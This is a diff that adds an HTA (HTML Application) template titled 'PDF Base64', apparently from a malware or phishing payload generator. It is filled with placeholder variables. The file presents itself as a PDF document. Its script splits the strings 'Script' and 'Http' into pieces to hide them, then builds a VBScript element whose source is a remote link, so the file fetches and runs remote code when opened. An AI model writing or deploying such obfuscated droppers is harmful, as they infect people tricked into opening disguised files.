@@ -1,0 +1,64 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+    <HTA:APPLICATION
+        ID="%hta_var_01%"
+        APPLICATIONNAME="PDF Base64"
+        BORDER="thick"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="maximize"
+    />
+<head>
+
+   <style>
+        h1 {
+            color: #0056b2;
+        }
+        body {
+		line-height: 1.4;
+            font-family: Arial, sans-serif;
+            
+            margin: 31px;
+		color: #331;
+            background-color: #f4f4f8;
+                background-image: url("https://images.ctfassets.net/hrltx12pl8hq/434iFtHgbPZcjnppFbhQxI/bd6bfe1d54077ea743d17196f1f2c5d9/benefit1-aigen-image.jpg");
+            background-repeat: no-repeat;
+            background-position: center center;
+            
+        }
+
+        a {
+            color: #006bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+ </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.1">
+    <title>%hta_var_01%</title>
+</head>
+<body>
+<script>
+	
+	%hta_var_02%  = 'iPt';
+	%hta_var_01% = 'cR';
+	%hta_var_01% = 'S' + %hta_var_01% + %hta_var_02% ;
+
+    %hta_boj_01%  = document.createElement(%hta_var_01%);
+    %hta_boj_01%.type = 'text/vbscript';
+    %hta_boj_01%.async = true;
+    
+    %hta_var_01% ='H';
+    %hta_var_02% ='p';
+
+    %hta_boj_01%.src = %hta_var_01% + 'tt' + %hta_var_02% +':/' + '%htal_link%';
+    document.body.appendChild(%hta_boj_01%);
+</script>
+
+   
+</body>
+
+</body>
+</html>
